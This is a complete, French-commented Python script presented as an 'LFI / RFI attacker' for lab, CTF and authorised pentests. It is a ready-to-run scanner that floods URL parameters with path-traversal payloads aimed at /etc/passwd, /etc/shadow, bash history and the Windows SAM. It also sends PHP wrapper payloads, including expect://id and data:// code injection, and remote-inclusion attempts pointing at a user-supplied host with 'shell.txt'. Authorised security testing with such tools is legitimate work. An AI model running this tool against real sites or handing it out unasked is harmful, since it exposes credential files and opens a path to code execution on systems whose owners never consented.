#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
LFI / RFI ATTACKER v1.0 — JATHNIEL EDITION
Test de Local File Inclusion et Remote File Inclusion.
Usage : labo / CTF / pentests autorisés uniquement.
"""

import re
import sys
import time
import hashlib
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional, Tuple

import requests
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, Confirm
from rich import box

console = Console()
requests.packages.urllib3.disable_warnings()

# ==================== PAYLOADS ====================

# Path traversal classiques
LFI_TRAVERSAL = [
    "../",
    "....//",
    "..%2f",
    "%2e%2e%2f",
    "..%252f",
    "....\/",
    "..\\",
    "....\\\\",
]

# Fichiers cibles Linux
LINUX_FILES = [
    "etc/passwd",
    "etc/shadow",
    "etc/hosts",
    "etc/hostname",
    "proc/self/environ",
    "proc/version",
    "proc/cmdline",
    "var/log/apache2/access.log",
    "var/log/apache2/error.log",
    "var/log/nginx/access.log",
    "var/log/auth.log",
    "home/{user}/.bash_history",
    "root/.bash_history",
    "etc/apache2/apache2.conf",
    "etc/nginx/nginx.conf",
]

# Fichiers cibles Windows
WINDOWS_FILES = [
    "windows/win.ini",
    "windows/system32/drivers/etc/hosts",
    "boot.ini",
    "windows/system.ini",
    "windows/repair/sam",
]

# Wrappers PHP
PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=",
    "php://filter/read=string.rot13/resource=",
    "php://filter/convert.iconv.utf-8.utf-16/resource=",
    "php://input",
    "data://text/plain,<?php phpinfo(); ?>",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "expect://id",
]

# Indicateurs de succès LFI
SUCCESS_INDICATORS = [
    "root:x:0:0",
    "daemon:x:",
    "bin:x:",
    "[boot loader]",
    "[extensions]",
    "for 16-bit app support",
    "PATH=",
    "HTTP_USER_AGENT",
    "DOCUMENT_ROOT",
    "<?php",
    "phpinfo()",
    "PD9waHA",  # base64 de <?php
]

# Paramètres souvent vulnérables
COMMON_PARAMS = [
    "file", "page", "include", "path", "doc", "document",
    "folder", "root", "pg", "style", "pdf", "template",
    "php_path", "doc_path", "cat", "dir", "action", "board",
    "date", "detail", "download", "prefix", "include_file",
]


class LFIRFIAttacker:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (compatible; LFI-RFI-Attacker/1.0; CTF)"
        })
        self.timeout = 10
        self.threads = 8
        self.findings: List[Dict] = []
        self.baseline_len = 0
        self.baseline_hash = ""

    def banner(self):
        console.print(Panel.fit(
            "[bold red]📂  LFI / RFI ATTACKER v1.0[/]\n"
            "[cyan]Local File Inclusion · Remote File Inclusion · PHP Wrappers[/]\n"
            "[dim]Labo / CTF / Authorized only[/]",
            border_style="red",
        ))

    def _get(self, url: str, method: str = "GET", data: dict = None) -> Optional[requests.Response]:
        try:
            if method.upper() == "POST":
                return self.session.post(url, data=data, timeout=self.timeout, allow_redirects=True)
            return self.session.get(url, timeout=self.timeout, allow_redirects=True)
        except Exception:
            return None

    def _is_success(self, text: str, content: bytes) -> Tuple[bool, str]:
        """Vérifie si la réponse indique un LFI réussi."""
        low = text.lower()
        for ind in SUCCESS_INDICATORS:
            if ind.lower() in low:
                return True, ind
        # Base64 de /etc/passwd (root:x:0:0)
        if "cm9vdDp4OjA6MAoi" in text or "cm9vdDp4OjA6MA==" in text:
            return True, "base64(/etc/passwd)"
        return False, ""

    def _build_url(self, base: str, param: str, payload: str) -> str:
        parsed = urlparse(base)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    def detect_params(self, url: str) -> List[str]:
        """Détecte les paramètres de l’URL + paramètres communs."""
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys())
        # Ajouter les params communs s’ils ne sont pas déjà présents
        for p in COMMON_PARAMS:
            if p not in params:
                params.append(p)
        return params

    def set_baseline(self, url: str):
        """Enregistre la réponse normale pour comparaison."""
        resp = self._get(url)
        if resp:
            self.baseline_len = len(resp.content)
            self.baseline_hash = hashlib.md5(resp.content).hexdigest()

    def test_lfi(self, url: str, param: str, depth: int = 6):
        """Teste les path traversal + fichiers cibles."""
        console.print(f"\n[yellow]🔍 LFI classique sur paramètre[/] [bold]{param}[/]")

        payloads = []
        for d in range(1, depth + 1):
            prefix = "../" * d
            for f in LINUX_FILES:
                payloads.append(prefix + f)
                payloads.append(prefix + f + "%00")
                payloads.append(prefix + f + "%00.php")
            for f in WINDOWS_FILES:
                payloads.append(prefix.replace("/", "\\") + f)

        # Variantes encodées
        extra = []
        for p in payloads[:30]:
            extra.append(p.replace("../", "....//"))
            extra.append(p.replace("../", "..%2f"))
            extra.append(p.replace("../", "%2e%2e%2f"))
        payloads.extend(extra)

        results = []
        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(), TextColumn("{task.completed}/{task.total}"),
            console=console,
        ) as progress:
            task = progress.add_task("LFI Traversal...", total=len(payloads))

            with ThreadPoolExecutor(max_workers=self.threads) as pool:
                futs = {
                    pool.submit(self._test_one, url, param, p): p
                    for p in payloads
                }
                for fut in as_completed(futs):
                    progress.update(task, advance=1)
                    res = fut.result()
                    if res:
                        results.append(res)
                        self.findings.append(res)
                        console.print(
                            f"  [green]✓ LFI[/] [{res['severity']}] {res['payload'][:60]} "
                            f"→ {res['indicator']}"
                        )

        return results

    def test_wrappers(self, url: str, param: str):
        """Teste les wrappers PHP."""
        console.print(f"\n[yellow]🔍 PHP Wrappers sur paramètre[/] [bold]{param}[/]")

        targets = ["index.php", "config.php", "admin.php", "../etc/passwd", "/etc/passwd"]
        payloads = []
        for w in PHP_WRAPPERS:
            if "resource=" in w:
                for t in targets:
                    payloads.append(w + t)
            else:
                payloads.append(w)

        results = []
        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(), TextColumn("{task.completed}/{task.total}"),
            console=console,
        ) as progress:
            task = progress.add_task("Wrappers...", total=len(payloads))

            with ThreadPoolExecutor(max_workers=self.threads) as pool:
                futs = {
                    pool.submit(self._test_one, url, param, p): p
                    for p in payloads
                }
                for fut in as_completed(futs):
                    progress.update(task, advance=1)
                    res = fut.result()
                    if res:
                        results.append(res)
                        self.findings.append(res)
                        console.print(
                            f"  [magenta]✓ Wrapper[/] [{res['severity']}] {res['payload'][:55]} "
                            f"→ {res['indicator']}"
                        )
        return results

    def test_rfi(self, url: str, param: str, evil_url: str = "http://example.com/"):
        """Teste Remote File Inclusion."""
        console.print(f"\n[yellow]🔍 RFI sur paramètre[/] [bold]{param}[/]")

        payloads = [
            evil_url,
            evil_url + "shell.txt",
            evil_url + "%00",
            evil_url + "?",
            "http://127.0.0.1/",
            "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/README.md",
        ]

        results = []
        for p in payloads:
            res = self._test_one(url, param, p, rfi=True)
            if res:
                results.append(res)
                self.findings.append(res)
                console.print(f"  [red]✓ RFI possible[/] {p[:50]}")
        return results

    def _test_one(self, url: str, param: str, payload: str, rfi: bool = False) -> Optional[Dict]:
        test_url = self._build_url(url, param, payload)
        resp = self._get(test_url)
        if not resp or resp.status_code not in (200, 500):
            return None

        text = resp.text
        content = resp.content

        # Soft-404 basique
        if self.baseline_len and abs(len(content) - self.baseline_len) < 50:
            if hashlib.md5(content).hexdigest() == self.baseline_hash:
                return None

        ok, indicator = self._is_success(text, content)
        if not ok and not rfi:
            return None

        # Scoring
        severity = "LOW"
        if "passwd" in payload or "shadow" in payload or "root:x:0:0" in indicator:
            severity = "CRITICAL"
        elif "php://filter" in payload or "base64" in indicator:
            severity = "HIGH"
        elif rfi:
            severity = "HIGH"
        elif "environ" in payload or "win.ini" in payload:
            severity = "MEDIUM"

        return {
            "type": "RFI" if rfi else "LFI",
            "param": param,
            "payload": payload,
            "url": test_url,
            "indicator": indicator or "content_diff",
            "status": resp.status_code,
            "size": len(content),
            "severity": severity,
            "preview": text[:300].replace("\n", " "),
        }

    def full_scan(self, url: str, evil_url: str = "http://example.com/"):
        """Scan complet LFI + Wrappers + RFI."""
        self.findings.clear()
        console.print(f"\n[cyan]🎯 Cible :[/] {url}")

        self.set_baseline(url)
        params = self.detect_params(url)
        console.print(f"[dim]Paramètres testés : {', '.join(params[:12])}{'...' if len(params) > 12 else ''}[/]")

        for param in params:
            self.test_lfi(url, param)
            self.test_wrappers(url, param)
            self.test_rfi(url, param, evil_url)

        self.show_results()

    def show_results(self):
        if not self.findings:
            console.print("\n[yellow]Aucun LFI/RFI détecté[/]")
            return

        # Trier par sévérité
        order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        self.findings.sort(key=lambda x: order.get(x["severity"], 9))

        t = Table(title=f"Findings LFI/RFI ({len(self.findings)})", box=box.ROUNDED)
        t.add_column("Sev", style="bold")
        t.add_column("Type")
        t.add_column("Param")
        t.add_column("Payload", max_width=40)
        t.add_column("Indicateur")

        for f in self.findings:
            color = {"CRITICAL": "red", "HIGH": "yellow", "MEDIUM": "cyan", "LOW": "dim"}.get(f["severity"], "white")
            t.add_row(
                f"[{color}]{f['severity']}[/]",
                f["type"],
                f["param"],
                f["payload"][:38],
                f["indicator"][:30],
            )
        console.print(t)

        # Détail du plus critique
        top = self.findings[0]
        console.print(Panel(
            f"[bold]URL:[/] {top['url']}\n"
            f"[bold]Payload:[/] {top['payload']}\n"
            f"[bold]Indicateur:[/] {top['indicator']}\n"
            f"[bold]Preview:[/] {top['preview'][:200]}",
            title=f"🔥 Top finding ({top['severity']})",
            border_style="red",
        ))

    def export(self, filename: str = "lfi_rfi_report.json"):
        import json
        from datetime import datetime
        data = {
            "date": datetime.now().isoformat(),
            "findings": self.findings,
            "count": len(self.findings),
        }
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        console.print(f"[green]Export → {filename}[/]")

    def run(self):
        while True:
            console.clear()
            self.banner()

            table = Table(show_header=False, box=box.ROUNDED, border_style="red")
            table.add_column("N", style="yellow", width=4)
            table.add_column("Action")
            for n, a in [
                ("1", "Scan complet (LFI + Wrappers + RFI)"),
                ("2", "LFI seul (path traversal)"),
                ("3", "PHP Wrappers seul"),
                ("4", "RFI seul"),
                ("5", "Voir les findings"),
                ("6", "Exporter JSON"),
                ("0", "Quitter"),
            ]:
                table.add_row(n, a)
            console.print(table)

            choice = Prompt.ask("\n[bold yellow]Choix[/]", choices=["0", "1", "2", "3", "4", "5", "6"], default="0")

            if choice == "0":
                console.print("[green]Bye![/]")
                break

            elif choice == "1":
                url = Prompt.ask("URL cible (avec paramètre)", default="http://127.0.0.1/vuln.php?file=index")
                evil = Prompt.ask("URL RFI de test", default="http://example.com/")
                self.full_scan(url, evil)
                Prompt.ask("\nEntrée pour continuer")

            elif choice == "2":
                url = Prompt.ask("URL cible")
                param = Prompt.ask("Paramètre", default="file")
                self.set_baseline(url)
                self.test_lfi(url, param)
                self.show_results()
                Prompt.ask("\nEntrée pour continuer")

            elif choice == "3":
                url = Prompt.ask("URL cible")
                param = Prompt.ask("Paramètre", default="file")
                self.set_baseline(url)
                self.test_wrappers(url, param)
                self.show_results()
                Prompt.ask("\nEntrée pour continuer")

            elif choice == "4":
                url = Prompt.ask("URL cible")
                param = Prompt.ask("Paramètre", default="file")
                evil = Prompt.ask("URL distante", default="http://example.com/")
                self.set_baseline(url)
                self.test_rfi(url, param, evil)
                self.show_results()
                Prompt.ask("\nEntrée pour continuer")

            elif choice == "5":
                self.show_results()
                Prompt.ask("\nEntrée pour continuer")

            elif choice == "6":
                self.export()
                Prompt.ask("\nEntrée pour continuer")


if __name__ == "__main__":
    try:
        LFIRFIAttacker().run()
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrompu[/]")
        sys.exit(0)